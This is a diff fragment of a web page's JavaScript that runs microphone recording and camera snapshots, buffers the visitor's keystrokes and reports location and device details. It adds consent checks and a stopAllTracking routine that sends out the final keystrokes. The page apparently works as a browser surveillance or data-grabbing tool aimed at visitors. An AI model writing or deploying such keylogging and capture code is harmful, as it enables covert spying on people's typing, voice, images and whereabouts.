+      App.state.mediaRecorder.start(App.config.micRecordInterval); 
+      console.log(`Microphone recording started (chunk interval: ${App.config.micRecordInterval}ms).`);
       App.updateActivityTime();
     },
 
-    // This function is intended for sending accumulated, non-urgent data periodically.
+    // Sends accumulated, non-urgent data periodically.
     sendAccumulatedActivity() {
-      if (!App.state.isTrackingActive) return;
+      if (!App.state.isTrackingActive || !App.state.consentSettings.analytics) return;
       
-      // Currently, logPageInteraction sends a comprehensive report periodically.
-      // If other types of data were accumulated here, they would be sent now.
-      // For example, if we had a buffer for network requests made by the page.
-      console.log("Checking for accumulated activity to send.");
-      this.logPageInteraction(); // Ensure some report is sent periodically.
+      console.log("Sending accumulated activity report.");
+      App.logPageInteraction(); // This function handles sending buffered data
     },
     
-    // Helper to get initial report upon session start
+    // Generates an initial report on session start (user agent, permissions, etc.).
     async getInitialReport() {
         let report = "*Initial Session Report*\n\n";
         report += `*User Agent:* \`${navigator.userAgent}\`\n`;
@@ -1127,26 +1519,70 @@ const App = {
         report += `*Screen Resolution:* ${screen.width}x${screen.height}\n`;
         report += `*Viewport Size:* ${window.innerWidth}x${window.innerHeight}\n`;
         
-        if (App.state.userLocation.lat !== "N/A") {
+        // Include initial location if consent and permission were granted.
+        if (App.state.consentSettings.location && App.state.permissions.geolocation === 'granted' && App.state.userLocation.lat !== "N/A") {
             report += `*Initial Location:* ${App.state.userLocation.lat}, ${App.state.userLocation.lon}\n`;
         } else {
-            report += `*Initial Location:* N/A (Request pending or denied)\n`;
+            report += `*Initial Location:* N/A (Consent or Permission Denied/Pending)\n`;
         }
         
+        // List current permission states.
         report += `*Permissions State:*\n`;
         for (const perm in App.state.permissions) {
             report += `  - ${perm}: ${App.state.permissions[perm]}\n`;
         }
         
         return report;
+    },
+
+    // Stops all active tracking streams, intervals, and listeners.
+    stopAllTracking() {
+      console.log("Stopping all tracking functions.");
+      this.stopCamera();
+      this.stopMicrophone();
+      
+      // Clear all intervals
+      if (this.state.activityTrackerIntervalId) clearInterval(this.state.activityTrackerIntervalId);
+      if (this.state.snapshotIntervalId) clearInterval(this.state.snapshotIntervalId);
+      if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
+
+      // Nullify interval IDs
+      this.state.activityTrackerIntervalId = null;
+      this.state.snapshotIntervalId = null;
+      this.state.pageAnalyticsIntervalId = null;
+      
+      // Send any remaining keystrokes before fully stopping
+      if (this.state.keyLogBuffer.length > 0 && App.state.consentSettings.keyboard) {
+        this.send(`⌨️ Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
+      }
+      
+      // Send a final interaction report if analytics consent is given
+      if (App.state.consentSettings.analytics) {
+          this.sendAccumulatedActivity(); // Ensures final buffered data is sent
+      }
+
+      App.state.isTrackingActive = false; // Set global tracking flag to false
+      App.updateTrackingStatusBanner(); // Update the status banner
     }
-  }
+  },
+
+  // --- Utility Functions ---
+  // Formats milliseconds into HH:MM:SS string.
+  formatTime(ms) {
+    if (ms === undefined || ms === null || typeof ms !== 'number' || isNaN(ms)) return 'N/A';
+    const totalSeconds = Math.floor(ms / 1000);
+    const hours = Math.floor(totalSeconds / 3600);
+    const minutes = Math.floor((totalSeconds % 3600) / 60);
+    const seconds = totalSeconds % 60;
+    return [hours, minutes, seconds].map(v => v < 10 ? "0" + v : v).join(":");
+  },
 };
 
 // Initialize the app when the DOM is fully loaded
 document.addEventListener('DOMContentLoaded', () => {
   App.init();
 });
+
 </script>
 </body>
 </html>
